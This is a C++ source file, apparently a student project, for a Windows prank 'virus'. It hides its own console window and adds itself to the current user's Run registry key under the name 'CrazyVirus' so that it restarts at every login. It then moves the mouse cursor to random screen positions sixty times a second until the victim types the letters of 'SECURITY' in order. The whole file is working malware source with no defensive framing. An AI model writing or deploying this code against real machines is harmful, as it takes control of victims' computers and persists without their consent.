// Developed in Visual Studio 2019.
// Szymon Janusz G20792986 & Ben Dingwall G20792216

#include <string> // String class, used to store arrays of chars
#include <Windows.h> // Used for windows registry
#include <random> // Used to get random mouse position
#include <thread> // Used to make the program sleep

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

// How long to sleep for between switching mouse positions. Equates to the system running at 60FPS, changing mouse position once per frame.
// Results in no CPU performance impact.
const float kFPS = 60.0f;
const float kSLEEPTIME = 1000.0f / kFPS; // Milliseconds in a second / frames per second
const enum EKeys // Enum of shorts, used to store all keys that will be used in a kill switch
{
	EKeyS = 0x53,
	EKeyE = 0x45,
	EKeyC = 0x43,
	EKeyU = 0x55,
	EKeyR = 0x52,
	EKeyI = 0x49,
	EKeyT = 0x54,
	EKeyY = 0x59
};
const short kKillSwitches[]{EKeyS, EKeyE, EKeyC, EKeyU, EKeyR, EKeyI, EKeyT, EKeyY}; // The kill switches used to let the target shut off the virus

// Hide the application window so it cannot be closed easily
void HideWindow()
{
	HWND window = GetConsoleWindow();
	ShowWindow(window, SW_HIDE);
}

// Randomly change the mouse position on the screen and sleep.
void ChangeMousePos(POINT& mousePoint, const int& kHorizontalRes, const int& kVerticalRes)
{
	// Set the max mouse pos to the current resolution
	mousePoint.x = rand() % kHorizontalRes;
	mousePoint.y = rand() % kVerticalRes;
	SetCursorPos(mousePoint.x, mousePoint.y);
}

// Check the kill switch array at index.
// If all kill switches have been pressed, shut down the virus.
void CheckKillSwitch(int& index)
{
	// Check if the end of the kill switches is reached
	// Get total size of array and divide by size of the any element to get total number of elements in array.
	if (index == (sizeof(kKillSwitches) / sizeof(kKillSwitches[0])))
	{
		exit(0);
	}
	// else check if the kill switch at current index is pressed down.
	else if (GetAsyncKeyState(kKillSwitches[index]) & 0x8000)
	{
		index++;
	}
}

// Infect the registry with auto run key for the virus.
// Infects with the current location of the virus.
void InfectRegistry()
{
	// The workspace key where the directory to infect is
	HKEY WorkspaceKey = HKEY_CURRENT_USER;
	HKEY RunKey;

	// What directory to infect
	char kDirToInfect[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	// Check if virus cannot access the directory
	// Don't raise errors if virus can't open key, as window is hidden anyway.
	if (RegOpenKey(WorkspaceKey, kDirToInfect, &RunKey) == ERROR_SUCCESS)
	{
		// The value name given to the value in registry
		LPCTSTR valueName = "CrazyVirus";
		// Path to the virus
		TCHAR valuePath[MAX_PATH + 1];

		// Get the path to the virus
		GetModuleFileName(NULL, valuePath, MAX_PATH);

		// Write the key to registry so virus runs automatically.
		// REG_SZ = null terminated string.
		LONG RegVirusRun = RegSetValueEx(RunKey, valueName, NULL, REG_SZ,
			LPBYTE(valuePath), lstrlen(valuePath) * sizeof(TCHAR));

		// Close key. Disregard any errors.
		RegCloseKey(RunKey);
	}
}

// Get the current resolution of the desktop
void GetDesktopResolution(int& horizontalRes, int& verticalRes)
{
	RECT desktop;
	// Get a handle to the desktop window
	const HWND hDesktop = GetDesktopWindow();
	// Get the size of screen to the variable desktop
	GetWindowRect(hDesktop, &desktop);
	// The top left corner will have coordinates (0,0)
	// and the bottom right corner will have coordinates
	horizontalRes = desktop.right;
	verticalRes = desktop.bottom;
}

int main()
{
	// Generate random numbers depending on time current time
	srand(time(NULL));

	// Register the virus to run at startup.
	InfectRegistry();

	// Get current Mouse Position
	POINT mousePoint;
	GetCursorPos(&mousePoint);

	// Hide the window.
	HideWindow();

	// Get screen resolution of the monitor
	int horizRes;
	int vertRez;
	GetDesktopResolution(horizRes, vertRez);

	// Current index of the kill switch to check
	int killSwitchIndex = 0;

	// Infinitely change mouse position.
	while (true)
	{
		// Change the mouse position within the bounds of screen resolution
		ChangeMousePos(mousePoint, horizRes, vertRez);
		// Check if the current key in the kill switch array is pressed
		CheckKillSwitch(killSwitchIndex);
		// Don't use 100% of a cpu core, put the program to sleep so it runs only 1 time per frame
		Sleep(kSLEEPTIME);
	}
}